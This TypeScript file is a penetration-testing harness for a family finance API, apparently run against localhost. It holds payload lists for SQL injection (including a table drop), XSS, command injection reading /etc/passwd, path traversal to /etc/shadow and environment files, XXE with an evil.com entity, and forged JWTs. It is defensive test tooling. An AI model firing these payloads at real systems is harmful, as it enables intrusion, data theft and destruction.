/**
 * T450: Penetration Testing for API Endpoints
 *
 * Comprehensive penetration testing framework that simulates real-world attack scenarios
 * against API endpoints to identify security vulnerabilities and misconfigurations.
 */

import axios, { AxiosInstance, AxiosResponse } from 'axios';
import { randomBytes } from 'crypto';
import jwt from 'jsonwebtoken';

interface PenetrationTestResult {
  endpoint: string;
  method: string;
  testCase: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO';
  status: 'VULNERABLE' | 'SECURE' | 'ERROR' | 'SKIP';
  description: string;
  evidence?: any;
  recommendation: string;
  cwe?: string;
}

interface PenetrationTestSummary {
  totalTests: number;
  vulnerabilities: number;
  criticalFindings: number;
  highFindings: number;
  mediumFindings: number;
  lowFindings: number;
  overallRisk: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  results: PenetrationTestResult[];
}

class APIPenetrationTester {
  private apiClient: AxiosInstance;
  private baseUrl: string;
  private testResults: PenetrationTestResult[] = [];

  constructor(baseUrl: string = 'http://localhost:3000') {
    this.baseUrl = baseUrl;
    this.apiClient = axios.create({
      baseURL: baseUrl,
      timeout: 10000,
      validateStatus: () => true // Accept all status codes for testing
    });
  }

  /**
   * Run comprehensive penetration tests
   */
  async runPenetrationTests(): Promise<PenetrationTestSummary> {
    console.log('🔍 Starting API penetration testing...');
    console.log(`🎯 Target: ${this.baseUrl}`);

    this.testResults = [];

    try {
      // Authentication and authorization tests
      await this.testAuthenticationBypass();
      await this.testAuthorizationFlaws();
      await this.testJWTVulnerabilities();
      await this.testSessionManagement();

      // Input validation tests
      await this.testSQLInjection();
      await this.testXSSVulnerabilities();
      await this.testCommandInjection();
      await this.testPathTraversal();
      await this.testXXEVulnerabilities();

      // Business logic tests
      await this.testIDORVulnerabilities();
      await this.testRateLimiting();
      await this.testBusinessLogicFlaws();

      // Information disclosure tests
      await this.testInformationDisclosure();
      await this.testErrorHandling();
      await this.testDirectoryTraversal();

      // API-specific tests
      await this.testMassAssignment();
      await this.testAPIVersioning();
      await this.testCORSMisconfiguration();
      await this.testContentTypeValidation();

      return this.generateTestSummary();

    } catch (error) {
      this.addResult({
        endpoint: 'GENERAL',
        method: 'TEST',
        testCase: 'PENETRATION_TEST_EXECUTION',
        severity: 'CRITICAL',
        status: 'ERROR',
        description: `Penetration testing failed: ${error.message}`,
        recommendation: 'Fix testing infrastructure and re-run penetration tests',
        cwe: 'CWE-754'
      });

      return this.generateTestSummary();
    }
  }

  /**
   * Test authentication bypass vulnerabilities
   */
  private async testAuthenticationBypass(): Promise<void> {
    console.log('🔐 Testing authentication bypass vulnerabilities...');

    const testEndpoints = [
      { path: '/api/auth/me', method: 'GET' },
      { path: '/api/families', method: 'GET' },
      { path: '/api/income-events', method: 'GET' },
      { path: '/api/payments', method: 'GET' },
      { path: '/api/budget-categories', method: 'GET' }
    ];

    for (const endpoint of testEndpoints) {
      try {
        // Test 1: Access without authentication
        const noAuthResponse = await this.makeRequest(endpoint.method, endpoint.path);

        if (noAuthResponse.status === 200) {
          this.addResult({
            endpoint: endpoint.path,
            method: endpoint.method,
            testCase: 'NO_AUTHENTICATION_BYPASS',
            severity: 'CRITICAL',
            status: 'VULNERABLE',
            description: 'Endpoint accessible without authentication',
            evidence: { statusCode: noAuthResponse.status, data: noAuthResponse.data },
            recommendation: 'Implement proper authentication checks on all protected endpoints',
            cwe: 'CWE-287'
          });
        }

        // Test 2: Invalid token bypass attempts
        const invalidTokenHeaders = [
          { Authorization: 'Bearer invalid-token' },
          { Authorization: 'Bearer null' },
          { Authorization: 'Bearer undefined' },
          { Authorization: 'Bearer ' },
          { Authorization: 'invalid-token' },
          { Authorization: '' },
          { 'X-Auth-Token': 'bypass-attempt' }
        ];

        for (const headers of invalidTokenHeaders) {
          try {
            const response = await this.makeRequest(endpoint.method, endpoint.path, {}, headers);

            if (response.status === 200) {
              this.addResult({
                endpoint: endpoint.path,
                method: endpoint.method,
                testCase: 'INVALID_TOKEN_BYPASS',
                severity: 'CRITICAL',
                status: 'VULNERABLE',
                description: `Authentication bypass possible with invalid token: ${JSON.stringify(headers)}`,
                evidence: { headers, statusCode: response.status },
                recommendation: 'Properly validate authentication tokens',
                cwe: 'CWE-287'
              });
            }
          } catch (error) {
            // Expected - invalid tokens should be rejected
          }
        }

        // Test 3: SQL injection in authentication
        const sqlPayloads = [
          "' OR '1'='1",
          "admin'--",
          "' OR 1=1#",
          "' UNION SELECT * FROM users--",
          "'; DROP TABLE users;--"
        ];

        for (const payload of sqlPayloads) {
          try {
            const response = await this.makeRequest('POST', '/api/auth/login', {
              email: payload,
              password: payload
            });

            if (response.status === 200 && response.data.token) {
              this.addResult({
                endpoint: '/api/auth/login',
                method: 'POST',
                testCase: 'SQL_INJECTION_AUTH_BYPASS',
                severity: 'CRITICAL',
                status: 'VULNERABLE',
                description: `SQL injection vulnerability in authentication: ${payload}`,
                evidence: { payload, response: response.data },
                recommendation: 'Use parameterized queries and input validation',
                cwe: 'CWE-89'
              });
            }
          } catch (error) {
            // Expected for most payloads
          }
        }

      } catch (error) {
        this.addResult({
          endpoint: endpoint.path,
          method: endpoint.method,
          testCase: 'AUTH_BYPASS_TEST_ERROR',
          severity: 'MEDIUM',
          status: 'ERROR',
          description: `Failed to test authentication bypass: ${error.message}`,
          recommendation: 'Investigate endpoint availability for testing',
          cwe: 'CWE-754'
        });
      }
    }
  }

  /**
   * Test authorization flaws (IDOR, privilege escalation)
   */
  private async testAuthorizationFlaws(): Promise<void> {
    console.log('🔒 Testing authorization flaws...');

    // Test IDOR vulnerabilities
    const idorEndpoints = [
      { path: '/api/families/{id}', method: 'GET', resourceType: 'family' },
      { path: '/api/income-events/{id}', method: 'GET', resourceType: 'income' },
      { path: '/api/payments/{id}', method: 'GET', resourceType: 'payment' },
      { path: '/api/bank-accounts/{id}', method: 'GET', resourceType: 'bank' },
      { path: '/api/budget-categories/{id}', method: 'GET', resourceType: 'budget' }
    ];

    for (const endpoint of idorEndpoints) {
      // Test with different ID values
      const testIds = [
        1, 2, 3, 999, -1, 0,
        'abc', 'admin', 'null', 'undefined',
        '../../etc/passwd',
        '<script>alert(1)</script>',
        '${7*7}',
        randomBytes(16).toString('hex')
      ];

      for (const testId of testIds) {
        try {
          const testPath = endpoint.path.replace('{id}', testId.toString());
          const response = await this.makeRequest(endpoint.method, testPath);

          // Check for potential IDOR
          if (response.status === 200 && response.data) {
            this.addResult({
              endpoint: testPath,
              method: endpoint.method,
              testCase: 'IDOR_VULNERABILITY',
              severity: 'HIGH',
              status: 'VULNERABLE',
              description: `Potential IDOR vulnerability - accessed ${endpoint.resourceType} with ID: ${testId}`,
              evidence: { testedId: testId, statusCode: response.status, hasData: !!response.data },
              recommendation: 'Implement proper authorization checks for resource ownership',
              cwe: 'CWE-639'
            });
          }

          // Check for information disclosure in error messages
          if (response.status >= 400 && response.data && response.data.message) {
            const message = response.data.message.toLowerCase();
            if (message.includes('user') || message.includes('id') || message.includes('not found')) {
              this.addResult({
                endpoint: testPath,
                method: endpoint.method,
                testCase: 'INFORMATION_DISCLOSURE_ERROR',
                severity: 'MEDIUM',
                status: 'VULNERABLE',
                description: 'Error message may disclose sensitive information',
                evidence: { errorMessage: response.data.message },
                recommendation: 'Use generic error messages that don\'t reveal system internals',
                cwe: 'CWE-209'
              });
            }
          }

        } catch (error) {
          // Most requests should fail - that's expected
        }
      }
    }

    // Test privilege escalation
    await this.testPrivilegeEscalation();
  }

  /**
   * Test privilege escalation vulnerabilities
   */
  private async testPrivilegeEscalation(): Promise<void> {
    const privilegeTests = [
      // Test role manipulation in requests
      { path: '/api/auth/me', method: 'GET', manipulation: { role: 'admin' } },
      { path: '/api/families/members', method: 'POST', manipulation: { role: 'admin', permissions: ['admin'] } },
      { path: '/api/users/profile', method: 'PUT', manipulation: { isAdmin: true, role: 'admin' } }
    ];

    for (const test of privilegeTests) {
      try {
        // Test with role manipulation in body
        const response = await this.makeRequest(test.method, test.path, test.manipulation);

        if (response.status === 200) {
          this.addResult({
            endpoint: test.path,
            method: test.method,
            testCase: 'PRIVILEGE_ESCALATION',
            severity: 'CRITICAL',
            status: 'VULNERABLE',
            description: 'Potential privilege escalation through parameter manipulation',
            evidence: { manipulation: test.manipulation, statusCode: response.status },
            recommendation: 'Validate user privileges server-side, never trust client-sent role information',
            cwe: 'CWE-269'
          });
        }

        // Test with role manipulation in headers
        const headerResponse = await this.makeRequest(test.method, test.path, {}, test.manipulation);

        if (headerResponse.status === 200) {
          this.addResult({
            endpoint: test.path,
            method: test.method,
            testCase: 'PRIVILEGE_ESCALATION_HEADERS',
            severity: 'CRITICAL',
            status: 'VULNERABLE',
            description: 'Potential privilege escalation through header manipulation',
            evidence: { headerManipulation: test.manipulation, statusCode: headerResponse.status },
            recommendation: 'Never trust role information from request headers',
            cwe: 'CWE-269'
          });
        }

      } catch (error) {
        // Expected for most privilege escalation attempts
      }
    }
  }

  /**
   * Test JWT-specific vulnerabilities
   */
  private async testJWTVulnerabilities(): Promise<void> {
    console.log('🎫 Testing JWT vulnerabilities...');

    // Test algorithm confusion attacks
    const algorithmConfusionPayloads = [
      // None algorithm
      jwt.sign({ userId: 'admin', role: 'admin' }, '', { algorithm: 'none' as any }),

      // Modified algorithms
      jwt.sign({ userId: 'admin', role: 'admin' }, 'secret', { algorithm: 'HS256' }).replace('HS256', 'none'),
      jwt.sign({ userId: 'admin', role: 'admin' }, 'secret', { algorithm: 'HS256' }).replace('HS256', 'HS512'),
    ];

    const testEndpoints = ['/api/auth/me', '/api/families'];

    for (const endpoint of testEndpoints) {
      for (const payload of algorithmConfusionPayloads) {
        try {
          const response = await this.makeRequest('GET', endpoint, {}, {
            Authorization: `Bearer ${payload}`
          });

          if (response.status === 200) {
            this.addResult({
              endpoint,
              method: 'GET',
              testCase: 'JWT_ALGORITHM_CONFUSION',
              severity: 'CRITICAL',
              status: 'VULNERABLE',
              description: 'JWT algorithm confusion vulnerability detected',
              evidence: { token: payload.substring(0, 50) + '...' },
              recommendation: 'Explicitly validate JWT algorithms and reject "none" algorithm',
              cwe: 'CWE-347'
            });
          }
        } catch (error) {
          // Expected - malformed JWTs should be rejected
        }
      }
    }

    // Test JWT tampering
    const tamperedTokens = [
      // Modified header
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.tampered-signature',

      // Modified payload
      jwt.sign({ userId: 'admin', role: 'admin' }, 'wrong-secret', { algorithm: 'HS256' }),

      // Empty signature
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.',
    ];

    for (const endpoint of testEndpoints) {
      for (const token of tamperedTokens) {
        try {
          const response = await this.makeRequest('GET', endpoint, {}, {
            Authorization: `Bearer ${token}`
          });

          if (response.status === 200) {
            this.addResult({
              endpoint,
              method: 'GET',
              testCase: 'JWT_TAMPERING',
              severity: 'CRITICAL',
              status: 'VULNERABLE',
              description: 'JWT signature validation bypass detected',
              evidence: { token: token.substring(0, 50) + '...' },
              recommendation: 'Properly validate JWT signatures with correct secrets',
              cwe: 'CWE-347'
            });
          }
        } catch (error) {
          // Expected - tampered JWTs should be rejected
        }
      }
    }
  }

  /**
   * Test session management vulnerabilities
   */
  private async testSessionManagement(): Promise<void> {
    console.log('🔄 Testing session management vulnerabilities...');

    // Test session fixation
    try {
      const fixedSessionId = 'fixed-session-' + randomBytes(8).toString('hex');

      const loginResponse = await this.makeRequest('POST', '/api/auth/login', {
        email: 'test@example.com',
        password: 'password'
      }, {
        Cookie: `sessionId=${fixedSessionId}`
      });

      if (loginResponse.headers['set-cookie']) {
        const cookies = loginResponse.headers['set-cookie'];
        const hasFixedSession = cookies.some(cookie => cookie.includes(fixedSessionId));

        if (hasFixedSession) {
          this.addResult({
            endpoint: '/api/auth/login',
            method: 'POST',
            testCase: 'SESSION_FIXATION',
            severity: 'HIGH',
            status: 'VULNERABLE',
            description: 'Session fixation vulnerability - session ID not regenerated after login',
            evidence: { fixedSessionId, cookies },
            recommendation: 'Regenerate session IDs after successful authentication',
            cwe: 'CWE-384'
          });
        }
      }
    } catch (error) {
      // Expected if login fails
    }

    // Test session timeout
    this.addResult({
      endpoint: 'SESSION_MANAGEMENT',
      method: 'TEST',
      testCase: 'SESSION_TIMEOUT_TEST',
      severity: 'INFO',
      status: 'SKIP',
      description: 'Session timeout testing requires manual validation',
      recommendation: 'Manually verify session timeout configuration is appropriate',
      cwe: 'CWE-613'
    });
  }

  /**
   * Test SQL injection vulnerabilities
   */
  private async testSQLInjection(): Promise<void> {
    console.log('💉 Testing SQL injection vulnerabilities...');

    const sqlPayloads = [
      "' OR '1'='1",
      "' OR 1=1--",
      "' UNION SELECT * FROM users--",
      "'; DROP TABLE users;--",
      "' AND (SELECT COUNT(*) FROM users) > 0--",
      "' OR SLEEP(5)--",
      "' OR pg_sleep(5)--",
      "1' OR '1'='1",
      "admin'/**/OR/**/1=1--",
      "' OR EXISTS(SELECT * FROM users WHERE username='admin')--"
    ];

    const testEndpoints = [
      { path: '/api/income-events', method: 'GET', param: 'search' },
      { path: '/api/payments', method: 'GET', param: 'category' },
      { path: '/api/transactions', method: 'GET', param: 'account' },
      { path: '/api/families/members', method: 'GET', param: 'role' },
      { path: '/api/budget-categories', method: 'GET', param: 'name' }
    ];

    for (const endpoint of testEndpoints) {
      for (const payload of sqlPayloads) {
        try {
          // Test in query parameters
          const queryResponse = await this.makeRequest(
            endpoint.method,
            `${endpoint.path}?${endpoint.param}=${encodeURIComponent(payload)}`
          );

          // Look for SQL error messages or unexpected data
          if (queryResponse.data && typeof queryResponse.data === 'string') {
            const errorIndicators = [
              'sql', 'syntax error', 'mysql', 'postgresql', 'ora-',
              'sqlite', 'column', 'table', 'database', 'prisma'
            ];

            const responseText = queryResponse.data.toLowerCase();
            if (errorIndicators.some(indicator => responseText.includes(indicator))) {
              this.addResult({
                endpoint: endpoint.path,
                method: endpoint.method,
                testCase: 'SQL_INJECTION_QUERY',
                severity: 'CRITICAL',
                status: 'VULNERABLE',
                description: `SQL injection vulnerability in query parameter: ${endpoint.param}`,
                evidence: { payload, response: queryResponse.data.substring(0, 200) },
                recommendation: 'Use parameterized queries and input validation',
                cwe: 'CWE-89'
              });
            }
          }

          // Test in POST body for applicable endpoints
          if (endpoint.method === 'POST' || endpoint.method === 'PUT') {
            const bodyResponse = await this.makeRequest(endpoint.method, endpoint.path, {
              [endpoint.param]: payload
            });

            if (bodyResponse.data && typeof bodyResponse.data === 'string') {
              const errorIndicators = [
                'sql', 'syntax error', 'mysql', 'postgresql', 'ora-',
                'sqlite', 'column', 'table', 'database', 'prisma'
              ];

              const responseText = bodyResponse.data.toLowerCase();
              if (errorIndicators.some(indicator => responseText.includes(indicator))) {
                this.addResult({
                  endpoint: endpoint.path,
                  method: endpoint.method,
                  testCase: 'SQL_INJECTION_BODY',
                  severity: 'CRITICAL',
                  status: 'VULNERABLE',
                  description: `SQL injection vulnerability in request body: ${endpoint.param}`,
                  evidence: { payload, response: bodyResponse.data.substring(0, 200) },
                  recommendation: 'Use parameterized queries and input validation',
                  cwe: 'CWE-89'
                });
              }
            }
          }

        } catch (error) {
          // Most SQL injection attempts should fail
        }
      }
    }
  }

  /**
   * Test XSS vulnerabilities
   */
  private async testXSSVulnerabilities(): Promise<void> {
    console.log('🎭 Testing XSS vulnerabilities...');

    const xssPayloads = [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      'javascript:alert(1)',
      '<svg onload=alert(1)>',
      '"><script>alert(1)</script>',
      '<iframe src="javascript:alert(1)">',
      '<body onload=alert(1)>',
      '<script>fetch("/api/auth/me").then(r=>r.json()).then(d=>alert(JSON.stringify(d)))</script>'
    ];

    const testEndpoints = [
      { path: '/api/families', method: 'PUT', field: 'name' },
      { path: '/api/income-events', method: 'POST', field: 'description' },
      { path: '/api/payments', method: 'POST', field: 'description' },
      { path: '/api/spending-categories', method: 'POST', field: 'name' },
      { path: '/api/budget-categories', method: 'POST', field: 'name' }
    ];

    for (const endpoint of testEndpoints) {
      for (const payload of xssPayloads) {
        try {
          const response = await this.makeRequest(endpoint.method, endpoint.path, {
            [endpoint.field]: payload
          });

          // Check if payload is reflected in response
          if (response.data && JSON.stringify(response.data).includes(payload)) {
            this.addResult({
              endpoint: endpoint.path,
              method: endpoint.method,
              testCase: 'XSS_REFLECTED',
              severity: 'HIGH',
              status: 'VULNERABLE',
              description: `Reflected XSS vulnerability in field: ${endpoint.field}`,
              evidence: { payload, field: endpoint.field },
              recommendation: 'Implement proper input validation and output encoding',
              cwe: 'CWE-79'
            });
          }

          // Check for XSS in error messages
          if (response.status >= 400 && response.data && response.data.message) {
            if (response.data.message.includes(payload)) {
              this.addResult({
                endpoint: endpoint.path,
                method: endpoint.method,
                testCase: 'XSS_ERROR_MESSAGE',
                severity: 'HIGH',
                status: 'VULNERABLE',
                description: 'XSS vulnerability in error message',
                evidence: { payload, errorMessage: response.data.message },
                recommendation: 'Sanitize user input in error messages',
                cwe: 'CWE-79'
              });
            }
          }

        } catch (error) {
          // Expected for most XSS attempts
        }
      }
    }
  }

  /**
   * Test command injection vulnerabilities
   */
  private async testCommandInjection(): Promise<void> {
    console.log('⚡ Testing command injection vulnerabilities...');

    const commandPayloads = [
      '; ls -la',
      '&& cat /etc/passwd',
      '| whoami',
      '`id`',
      '$(whoami)',
      '; ping -c 1 127.0.0.1',
      '& net user',
      '|| dir',
      '; sleep 5',
      '`sleep 5`',
      '$(sleep 5)'
    ];

    const testEndpoints = [
      { path: '/api/reports/export', method: 'POST', field: 'filename' },
      { path: '/api/reports/custom', method: 'POST', field: 'query' },
      { path: '/api/plaid/webhook', method: 'POST', field: 'webhook_code' }
    ];

    for (const endpoint of testEndpoints) {
      for (const payload of commandPayloads) {
        try {
          const startTime = Date.now();

          const response = await this.makeRequest(endpoint.method, endpoint.path, {
            [endpoint.field]: payload
          });

          const responseTime = Date.now() - startTime;

          // Check for time-based command injection (sleep commands)
          if (responseTime > 5000 && payload.includes('sleep')) {
            this.addResult({
              endpoint: endpoint.path,
              method: endpoint.method,
              testCase: 'COMMAND_INJECTION_TIME_BASED',
              severity: 'CRITICAL',
              status: 'VULNERABLE',
              description: `Time-based command injection detected in field: ${endpoint.field}`,
              evidence: { payload, responseTime },
              recommendation: 'Never execute user input as system commands, use safe alternatives',
              cwe: 'CWE-78'
            });
          }

          // Check for command output in response
          if (response.data && typeof response.data === 'string') {
            const commandIndicators = [
              'total ', 'drwxr', '-rw-r', 'uid=', 'gid=', 'root:', 'bin/sh',
              'PING ', 'packet', 'Administrator', 'System32'
            ];

            const responseText = response.data;
            if (commandIndicators.some(indicator => responseText.includes(indicator))) {
              this.addResult({
                endpoint: endpoint.path,
                method: endpoint.method,
                testCase: 'COMMAND_INJECTION_OUTPUT',
                severity: 'CRITICAL',
                status: 'VULNERABLE',
                description: `Command injection with output detected in field: ${endpoint.field}`,
                evidence: { payload, output: responseText.substring(0, 200) },
                recommendation: 'Never execute user input as system commands',
                cwe: 'CWE-78'
              });
            }
          }

        } catch (error) {
          // Expected for most command injection attempts
        }
      }
    }
  }

  /**
   * Test path traversal vulnerabilities
   */
  private async testPathTraversal(): Promise<void> {
    console.log('📁 Testing path traversal vulnerabilities...');

    const pathPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '../../../proc/self/environ',
      '../../../var/log/auth.log',
      '/etc/shadow',
      'C:\\boot.ini',
      '/proc/version'
    ];

    const testEndpoints = [
      { path: '/api/reports/export', method: 'GET', param: 'file' },
      { path: '/api/files/download', method: 'GET', param: 'path' },
      { path: '/api/documents/view', method: 'GET', param: 'document' }
    ];

    for (const endpoint of testEndpoints) {
      for (const payload of pathPayloads) {
        try {
          const response = await this.makeRequest(
            endpoint.method,
            `${endpoint.path}?${endpoint.param}=${encodeURIComponent(payload)}`
          );

          // Check for file content indicators
          if (response.data && typeof response.data === 'string') {
            const fileIndicators = [
              'root:x:', 'daemon:x:', '# hosts file', '[boot loader]',
              'Linux version', 'PATH=', 'USER=', 'HOME='
            ];

            const responseText = response.data;
            if (fileIndicators.some(indicator => responseText.includes(indicator))) {
              this.addResult({
                endpoint: endpoint.path,
                method: endpoint.method,
                testCase: 'PATH_TRAVERSAL',
                severity: 'CRITICAL',
                status: 'VULNERABLE',
                description: `Path traversal vulnerability detected in parameter: ${endpoint.param}`,
                evidence: { payload, content: responseText.substring(0, 200) },
                recommendation: 'Validate and sanitize file paths, use whitelisting approach',
                cwe: 'CWE-22'
              });
            }
          }

        } catch (error) {
          // Expected for most path traversal attempts
        }
      }
    }
  }

  /**
   * Test XXE vulnerabilities
   */
  private async testXXEVulnerabilities(): Promise<void> {
    console.log('📄 Testing XXE vulnerabilities...');

    const xxePayloads = [
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://evil.com/malicious.dtd">]><root>&xxe;</root>',
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root></root>',
    ];

    const testEndpoints = [
      { path: '/api/reports/import', method: 'POST' },
      { path: '/api/data/upload', method: 'POST' },
      { path: '/api/config/update', method: 'PUT' }
    ];

    for (const endpoint of testEndpoints) {
      for (const payload of xxePayloads) {
        try {
          const response = await this.makeRequest(endpoint.method, endpoint.path, payload, {
            'Content-Type': 'application/xml'
          });

          // Check for file content in response
          if (response.data && typeof response.data === 'string') {
            if (response.data.includes('root:x:') || response.data.includes('daemon:x:')) {
              this.addResult({
                endpoint: endpoint.path,
                method: endpoint.method,
                testCase: 'XXE_VULNERABILITY',
                severity: 'CRITICAL',
                status: 'VULNERABLE',
                description: 'XXE vulnerability detected - external entity processing enabled',
                evidence: { payload: payload.substring(0, 100), response: response.data.substring(0, 200) },
                recommendation: 'Disable external entity processing in XML parsers',
                cwe: 'CWE-611'
              });
            }
          }

        } catch (error) {
          // Expected for most XXE attempts
        }
      }
    }
  }

  /**
   * Test IDOR vulnerabilities (expanded)
   */
  private async testIDORVulnerabilities(): Promise<void> {
    console.log('🔑 Testing IDOR vulnerabilities...');

    const idorTests = [
      { endpoint: '/api/families/{id}', method: 'GET', resource: 'family' },
      { endpoint: '/api/families/{id}', method: 'PUT', resource: 'family' },
      { endpoint: '/api/families/{id}', method: 'DELETE', resource: 'family' },
      { endpoint: '/api/income-events/{id}', method: 'GET', resource: 'income' },
      { endpoint: '/api/income-events/{id}', method: 'PUT', resource: 'income' },
      { endpoint: '/api/income-events/{id}', method: 'DELETE', resource: 'income' },
      { endpoint: '/api/payments/{id}', method: 'GET', resource: 'payment' },
      { endpoint: '/api/payments/{id}', method: 'PUT', resource: 'payment' },
      { endpoint: '/api/payments/{id}', method: 'DELETE', resource: 'payment' },
    ];

    const testIds = [
      1, 2, 3, 999, 9999,
      '00000000-0000-0000-0000-000000000001',
      '00000000-0000-0000-0000-000000000002',
      randomBytes(16).toString('hex'),
      'admin',
      '../admin',
      '*'
    ];

    for (const test of idorTests) {
      for (const testId of testIds) {
        try {
          const testPath = test.endpoint.replace('{id}', testId.toString());
          const response = await this.makeRequest(test.method, testPath);

          if (response.status === 200 && response.data) {
            this.addResult({
              endpoint: testPath,
              method: test.method,
              testCase: 'IDOR_ACCESS_CONTROL',
              severity: 'HIGH',
              status: 'VULNERABLE',
              description: `Potential IDOR: unauthorized access to ${test.resource} with ID: ${testId}`,
              evidence: { resourceType: test.resource, accessedId: testId, statusCode: response.status },
              recommendation: 'Implement proper authorization checks for resource access',
              cwe: 'CWE-639'
            });
          }

        } catch (error) {
          // Expected for most IDOR attempts
        }
      }
    }
  }

  /**
   * Test rate limiting effectiveness
   */
  private async testRateLimiting(): Promise<void> {
    console.log('🚦 Testing rate limiting...');

    const rateLimitTests = [
      { endpoint: '/api/auth/login', method: 'POST', maxRequests: 100 },
      { endpoint: '/api/auth/register', method: 'POST', maxRequests: 50 },
      { endpoint: '/api/auth/forgot-password', method: 'POST', maxRequests: 20 },
      { endpoint: '/api/families', method: 'GET', maxRequests: 200 },
    ];

    for (const test of rateLimitTests) {
      try {
        const responses: AxiosResponse[] = [];
        const startTime = Date.now();

        // Send multiple requests rapidly
        for (let i = 0; i < test.maxRequests; i++) {
          try {
            const response = await this.makeRequest(test.method, test.endpoint, {
              test: `rate-limit-test-${i}`,
              email: `test${i}@example.com`,
              password: 'password'
            });
            responses.push(response);
          } catch (error) {
            // Some requests may fail due to rate limiting
          }

          // Small delay to avoid overwhelming the server
          if (i % 10 === 0) {
            await new Promise(resolve => setTimeout(resolve, 100));
          }
        }

        const successfulRequests = responses.filter(r => r.status < 400).length;
        const rateLimitedRequests = responses.filter(r => r.status === 429).length;
        const totalTime = Date.now() - startTime;

        // Analyze rate limiting effectiveness
        if (successfulRequests > test.maxRequests * 0.8) {
          this.addResult({
            endpoint: test.endpoint,
            method: test.method,
            testCase: 'RATE_LIMITING_WEAK',
            severity: 'MEDIUM',
            status: 'VULNERABLE',
            description: 'Rate limiting may be too permissive or ineffective',
            evidence: {
              successfulRequests,
              rateLimitedRequests,
              totalRequests: test.maxRequests,
              timeMs: totalTime
            },
            recommendation: 'Implement stricter rate limiting to prevent abuse',
            cwe: 'CWE-799'
          });
        }

        if (rateLimitedRequests === 0) {
          this.addResult({
            endpoint: test.endpoint,
            method: test.method,
            testCase: 'NO_RATE_LIMITING',
            severity: 'HIGH',
            status: 'VULNERABLE',
            description: 'No rate limiting detected on sensitive endpoint',
            evidence: { successfulRequests, totalRequests: test.maxRequests },
            recommendation: 'Implement rate limiting on all sensitive endpoints',
            cwe: 'CWE-799'
          });
        }

      } catch (error) {
        this.addResult({
          endpoint: test.endpoint,
          method: test.method,
          testCase: 'RATE_LIMITING_TEST_ERROR',
          severity: 'LOW',
          status: 'ERROR',
          description: `Failed to test rate limiting: ${error.message}`,
          recommendation: 'Investigate rate limiting implementation',
          cwe: 'CWE-754'
        });
      }
    }
  }

  /**
   * Test business logic flaws
   */
  private async testBusinessLogicFlaws(): Promise<void> {
    console.log('💼 Testing business logic flaws...');

    // Test negative values in financial operations
    const negativeValueTests = [
      { endpoint: '/api/income-events', method: 'POST', field: 'amount', value: -1000 },
      { endpoint: '/api/payments', method: 'POST', field: 'amount', value: -500 },
      { endpoint: '/api/budget-categories', method: 'POST', field: 'percentage', value: -50 },
      { endpoint: '/api/transactions', method: 'PUT', field: 'amount', value: -999999 }
    ];

    for (const test of negativeValueTests) {
      try {
        const response = await this.makeRequest(test.method, test.endpoint, {
          [test.field]: test.value,
          description: 'Test transaction',
          category: 'test'
        });

        if (response.status === 200 || response.status === 201) {
          this.addResult({
            endpoint: test.endpoint,
            method: test.method,
            testCase: 'NEGATIVE_VALUE_ACCEPTED',
            severity: 'HIGH',
            status: 'VULNERABLE',
            description: `Business logic flaw: negative ${test.field} value accepted`,
            evidence: { field: test.field, value: test.value, statusCode: response.status },
            recommendation: 'Implement proper business logic validation for financial values',
            cwe: 'CWE-840'
          });
        }

      } catch (error) {
        // Expected - negative values should be rejected
      }
    }

    // Test extreme values
    const extremeValueTests = [
      { endpoint: '/api/income-events', field: 'amount', value: 999999999999 },
      { endpoint: '/api/payments', field: 'amount', value: Number.MAX_SAFE_INTEGER },
      { endpoint: '/api/budget-categories', field: 'percentage', value: 999 }
    ];

    for (const test of extremeValueTests) {
      try {
        const response = await this.makeRequest('POST', test.endpoint, {
          [test.field]: test.value,
          description: 'Test transaction'
        });

        if (response.status === 200 || response.status === 201) {
          this.addResult({
            endpoint: test.endpoint,
            method: 'POST',
            testCase: 'EXTREME_VALUE_ACCEPTED',
            severity: 'MEDIUM',
            status: 'VULNERABLE',
            description: `Business logic flaw: extreme ${test.field} value accepted`,
            evidence: { field: test.field, value: test.value },
            recommendation: 'Implement reasonable limits for financial values',
            cwe: 'CWE-20'
          });
        }

      } catch (error) {
        // Expected - extreme values should be rejected
      }
    }
  }

  /**
   * Test information disclosure vulnerabilities
   */
  private async testInformationDisclosure(): Promise<void> {
    console.log('📊 Testing information disclosure...');

    // Test debug endpoints
    const debugEndpoints = [
      '/api/debug', '/api/debug/info', '/api/status', '/api/health',
      '/api/config', '/api/version', '/api/env', '/api/info'
    ];

    for (const endpoint of debugEndpoints) {
      try {
        const response = await this.makeRequest('GET', endpoint);

        if (response.status === 200 && response.data) {
          const sensitiveInfo = ['password', 'secret', 'key', 'token', 'database', 'admin'];
          const responseStr = JSON.stringify(response.data).toLowerCase();

          if (sensitiveInfo.some(info => responseStr.includes(info))) {
            this.addResult({
              endpoint,
              method: 'GET',
              testCase: 'SENSITIVE_INFO_DISCLOSURE',
              severity: 'HIGH',
              status: 'VULNERABLE',
              description: 'Debug endpoint exposes sensitive information',
              evidence: { endpoint, responseData: JSON.stringify(response.data).substring(0, 200) },
              recommendation: 'Remove or secure debug endpoints in production',
              cwe: 'CWE-200'
            });
          }
        }

      } catch (error) {
        // Expected for most debug endpoints
      }
    }

    // Test error message information disclosure
    const errorTriggers = [
      { path: '/api/nonexistent', method: 'GET' },
      { path: '/api/users/99999999', method: 'GET' },
      { path: '/api/families/invalid-uuid', method: 'GET' }
    ];

    for (const trigger of errorTriggers) {
      try {
        const response = await this.makeRequest(trigger.method, trigger.path);

        if (response.status >= 400 && response.data && response.data.message) {
